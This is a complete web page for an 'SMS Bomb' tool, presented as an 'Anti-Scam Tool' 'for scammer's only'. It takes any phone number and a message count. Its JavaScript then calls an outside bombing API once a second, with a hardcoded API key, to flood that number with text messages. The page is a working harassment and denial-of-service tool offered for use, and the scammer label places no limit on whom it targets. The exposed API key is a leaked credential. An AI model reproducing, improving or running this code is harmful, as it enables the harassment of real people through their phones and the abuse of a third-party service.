<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMS Bomb</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #ff7e00 0%, #ff5500 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 10px;
            color: #333;
            overflow: hidden;
            position: relative;
        }

        .animated-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            overflow: hidden;
        }

        .bubble {
            position: absolute;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.1);
            animation: float 15s infinite ease-in-out;
        }

        .bubble-1 {
            width: 80px;
            height: 80px;
            top: 10%;
            left: 10%;
            animation-delay: 0s;
            animation-duration: 20s;
        }

        .bubble-2 {
            width: 120px;
            height: 120px;
            top: 70%;
            left: 80%;
            animation-delay: 2s;
            animation-duration: 25s;
        }

        .bubble-3 {
            width: 60px;
            height: 60px;
            top: 60%;
            left: 15%;
            animation-delay: 4s;
            animation-duration: 18s;
        }

        .bubble-4 {
            width: 100px;
            height: 100px;
            top: 20%;
            left: 75%;
            animation-delay: 6s;
            animation-duration: 22s;
        }

        .bubble-5 {
            width: 90px;
            height: 90px;
            top: 80%;
            left: 40%;
            animation-delay: 8s;
            animation-duration: 17s;
        }

        .bubble-6 {
            width: 70px;
            height: 70px;
            top: 30%;
            left: 50%;
            animation-delay: 10s;
            animation-duration: 19s;
        }

        @keyframes float {
            0%, 100% {
                transform: translateY(0) translateX(0) rotate(0deg);
                opacity: 0.7;
            }
            25% {
                transform: translateY(-50px) translateX(30px) rotate(90deg);
                opacity: 0.4;
            }
            50% {
                transform: translateY(20px) translateX(60px) rotate(180deg);
                opacity: 0.6;
            }
            75% {
                transform: translateY(-30px) translateX(40px) rotate(270deg);
                opacity: 0.5;
            }
        }

        .container {
            width: 100%;
            max-width: 320px;
            background: #fff;
            border-radius: 10px;
            box-shadow: 0 6px 18px rgba(0, 0, 0, 0.15);
            overflow: hidden;
            animation: fadeIn 0.5s ease-out;
            z-index: 1;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(-15px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .header {
            background: linear-gradient(135deg, #ff7e00 0%, #ff5500 100%);
            color: #fff;
            padding: 12px;
            text-align: center;
        }

        .header h1 {
            font-size: 18px;
            margin-bottom: 4px;
            font-weight: 600;
        }

        .header p {
            font-size: 11px;
            opacity: 0.9;
        }

        .header-icon {
            font-size: 20px;
            margin-bottom: 6px;
            color: #fff;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% {
                transform: scale(1);
            }
            50% {
                transform: scale(1.08);
            }
            100% {
                transform: scale(1);
            }
        }

        .warning {
            background: #fff4f4;
            color: #d13c3c;
            padding: 6px;
            margin: 8px;
            border-radius: 5px;
            font-size: 11px;
            text-align: center;
            border: 1px solid #ffd0d0;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 4px;
        }

        .form-container {
            padding: 8px;
        }

        .input-group {
            margin-bottom: 12px;
        }

        .input-group label {
            display: block;
            margin-bottom: 4px;
            font-weight: 600;
            color: #444;
            font-size: 12px;
        }

        .input-group input {
            width: 100%;
            padding: 8px;
            border: 2px solid #e1e5eb;
            border-radius: 5px;
            font-size: 13px;
            transition: all 0.3s;
        }

        .input-group input:focus {
            border-color: #ff7e00;
            outline: none;
            box-shadow: 0 0 0 3px rgba(255, 126, 0, 0.2);
        }

        .btn-container {
            display: flex;
            gap: 6px;
            margin-bottom: 8px;
        }

        .btn {
            flex: 1;
            padding: 8px;
            border: none;
            border-radius: 5px;
            font-size: 12px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 4px;
            position: relative;
            overflow: hidden;
        }

        .btn:after {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 5px;
            height: 5px;
            background: rgba(255, 255, 255, 0.5);
            opacity: 0;
            border-radius: 100%;
            transform: scale(1, 1) translate(-50%);
            transform-origin: 50% 50%;
        }

        .btn-primary {
            background: #ff7e00;
            color: #fff;
            animation: glow-primary 2s infinite alternate;
        }

        @keyframes glow-primary {
            from {
                box-shadow: 0 0 5px #ff7e00, 0 0 10px #ff7e00;
            }
            to {
                box-shadow: 0 0 10px #ff7e00, 0 0 20px #ff7e00;
            }
        }

        .btn-primary:hover {
            background: #e67200;
            transform: translateY(-2px) scale(1.05);
            box-shadow: 0 4px 8px rgba(255, 126, 0, 0.4);
        }

        .btn-danger {
            background: #ff4757;
            color: #fff;
            animation: glow-danger 2s infinite alternate;
        }

        @keyframes glow-danger {
            from {
                box-shadow: 0 0 5px #ff4757, 0 0 10px #ff4757;
            }
            to {
                box-shadow: 0 0 10px #ff4757, 0 0 20px #ff4757;
            }
        }

        .btn-danger:hover {
            background: #ff2e40;
            transform: translateY(-2px) scale(1.05);
            box-shadow: 0 4px 8px rgba(255, 71, 87, 0.4);
        }

        .btn:disabled {
            opacity: 0.7;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
            animation: none;
        }

        .btn:not(:disabled):active:after {
            animation: ripple 1s ease-out;
        }

        @keyframes ripple {
            0% {
                transform: scale(0, 0);
                opacity: 0.5;
            }
            20% {
                transform: scale(25, 25);
                opacity: 0.3;
            }
            100% {
                opacity: 0;
                transform: scale(40, 40);
            }
        }

        .counter {
            text-align: center;
            font-size: 13px;
            font-weight: 600;
            margin: 12px 0;
            color: #ff7e00;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 4px;
        }

        .counter-number {
            background: #fff4e6;
            padding: 3px 6px;
            border-radius: 10px;
            min-width: 22px;
            display: inline-block;
            animation: countUp 0.5s ease-out;
        }

        @keyframes countUp {
            from {
                transform: scale(0.8);
                opacity: 0.5;
            }
            to {
                transform: scale(1);
                opacity: 1;
            }
        }

        .results {
            margin-top: 8px;
            padding: 8px;
            background: #f8f9fa;
            border-radius: 5px;
            max-height: 120px;
            overflow-y: auto;
            border: 1px solid #e1e5eb;
        }

        .results h3 {
            margin-bottom: 6px;
            color: #444;
            text-align: center;
            font-size: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 4px;
        }

        .log-entry {
            padding: 5px;
            border-bottom: 1px solid #eaeaea;
            font-size: 11px;
            margin-bottom: 3px;
            border-radius: 3px;
            background: #fff;
            display: flex;
            align-items: center;
            gap: 4px;
            animation: slideIn 0.3s ease-out;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateX(-8px);
            }
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }

        .log-entry:last-child {
            border-bottom: none;
            margin-bottom: 0;
        }

        .success {
            color: #2ed573;
            border-left: 2px solid #2ed573;
        }

        .error {
            color: #ff4757;
            border-left: 2px solid #ff4757;
        }

        .footer {
            text-align: center;
            padding: 8px;
            font-size: 10px;
            color: #777;
            background: #f8f9fa;
            border-top: 1px solid #e1e5eb;
        }

        .footer a {
            color: #ff7e00;
            text-decoration: none;
        }

        .footer a:hover {
            text-decoration: underline;
        }

        @media (max-width: 340px) {
            .btn-container {
                flex-direction: column;
            }
            .header h1 {
                font-size: 16px;
            }
            .counter {
                flex-wrap: wrap;
            }
        }
    </style>
</head>
<body>
    <div class="animated-bg">
        <div class="bubble bubble-1"></div>
        <div class="bubble bubble-2"></div>
        <div class="bubble bubble-3"></div>
        <div class="bubble bubble-4"></div>
        <div class="bubble bubble-5"></div>
        <div class="bubble bubble-6"></div>
    </div>
    
    <div class="container">
        <div class="header">
            <div class="header-icon"><i class="fas fa-bomb"></i></div>
            <h1>SMS Bomb</h1>
            <p>Anti-Scam Tool</p>
        </div>
        <div class="warning">
            <i class="fas fa-exclamation-triangle"></i>
            <span>this tool is for scammer's only</span>
        </div>
        <div class="form-container">
            <div class="input-group">
                <label for="phone"><i class="fas fa-phone"></i> Phone</label>
                <input type="text" id="phone" placeholder="Phone with country code">
            </div>
            <div class="input-group">
                <label for="amount"><i class="fas fa-bomb"></i> Messages</label>
                <input type="number" id="amount" value="10" min="1" max="50">
            </div>
            <div class="btn-container">
                <button id="startBtn" class="btn btn-primary"><i class="fas fa-play"></i> Start</button>
                <button id="stopBtn" class="btn btn-danger" disabled><i class="fas fa-stop"></i> Stop</button>
            </div>
            <div class="counter">
                <span>Sent:</span>
                <span class="counter-number" id="sentCount">0</span>
                <span>/</span>
                <span class="counter-number" id="totalCount">10</span>
            </div>
            <div class="results">
                <h3><i class="fas fa-history"></i> Log</h3>
                <div id="log"></div>
            </div>
        </div>
        <div class="footer">
            <p>for scammer's only</p>
            <p>© 2025 <a href="https://www.facebook.com/profile.php?id=61578130127315" target="_blank">Bryson</a> All rights reserved</p>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const phoneInput = document.getElementById('phone');
            const amountInput = document.getElementById('amount');
            const startBtn = document.getElementById('startBtn');
            const stopBtn = document.getElementById('stopBtn');
            const sentCountEl = document.getElementById('sentCount');
            const totalCountEl = document.getElementById('totalCount');
            const logEl = document.getElementById('log');
            
            let isBombing = false;
            let sentCount = 0;
            let totalCount = 0;
            let bombingInterval;
            
            amountInput.addEventListener('input', function() {
                totalCountEl.textContent = this.value;
            });
            
            totalCountEl.textContent = amountInput.value;
            
            function addLog(message, type = '') {
                const logEntry = document.createElement('div');
                logEntry.className = `log-entry ${type}`;
                
                const icon = document.createElement('i');
                icon.className = type === 'success' ? 'fas fa-check-circle' : 'fas fa-exclamation-circle';
                
                logEntry.appendChild(icon);
                logEntry.appendChild(document.createTextNode(message));
                
                logEl.appendChild(logEntry);
                logEl.scrollTop = logEl.scrollHeight;
            }
            
            startBtn.addEventListener('click', function() {
                const phone = phoneInput.value.trim();
                const amount = parseInt(amountInput.value);
                
                if (!phone) {
                    addLog('Enter phone number', 'error');
                    phoneInput.focus();
                    return;
                }
                
                if (isNaN(amount) || amount < 1 || amount > 50) {
                    addLog('Enter valid amount (1-50)', 'error');
                    amountInput.focus();
                    return;
                }
                
                sentCount = 0;
                sentCountEl.textContent = '0';
                totalCount = amount;
                totalCountEl.textContent = amount;
                
                isBombing = true;
                startBtn.disabled = true;
                stopBtn.disabled = false;
                phoneInput.disabled = true;
                amountInput.disabled = true;
                
                addLog(`Starting SMS to ${phone} with ${amount} messages`);
                
                bombingInterval = setInterval(sendSMS, 1000);
            });
            
            stopBtn.addEventListener('click', function() {
                clearInterval(bombingInterval);
                isBombing = false;
                startBtn.disabled = false;
                stopBtn.disabled = true;
                phoneInput.disabled = false;
                amountInput.disabled = false;
                
                addLog(`Stopped. Sent ${sentCount} messages`);
            });
            
            function sendSMS() {
                if (sentCount >= totalCount) {
                    clearInterval(bombingInterval);
                    isBombing = false;
                    startBtn.disabled = false;
                    stopBtn.disabled = true;
                    phoneInput.disabled = false;
                    amountInput.disabled = false;
                    
                    addLog(`Completed. Sent ${sentCount} messages`, 'success');
                    return;
                }
                
                const phone = phoneInput.value.trim();
                const apiKey = '50fc8294c26604552cc33c1745c06265ac99a338528748402f521f8034382b57';
                
                const apiUrl = `https://haji-mix-api.gleeze.com/api/smsbomber?phone=${phone}&amount=1&api_key=${apiKey}`;
                
                fetch(apiUrl, {
                    method: 'GET',
                    mode: 'cors'
                })
                .then(response => {
                    if (!response.ok) {
                        throw new Error(`HTTP error! Status: ${response.status}`);
                    }
                    return response.json();
                })
                .then(data => {
                    sentCount++;
                    sentCountEl.textContent = sentCount;
                    addLog(`Message ${sentCount} sent`, 'success');
                })
                .catch(error => {
                    addLog(`Error: ${error.message}`, 'error');
                });
            }
            
            // Add ripple effect to buttons
            const buttons = document.querySelectorAll('.btn');
            buttons.forEach(btn => {
                btn.addEventListener('click', function(e) {
                    if (this.disabled) return;
                    
                    const x = e.pageX - this.offsetLeft;
                    const y = e.pageY - this.offsetTop;
                    
                    const ripple = document.createElement('span');
                    ripple.classList.add('ripple-effect');
                    ripple.style.left = x + 'px';
                    ripple.style.top = y + 'px';
                    
                    this.appendChild(ripple);
                    
                    setTimeout(() => {
                        ripple.remove();
                    }, 600);
                });
            });
        });
    </script>
</body>
</html>
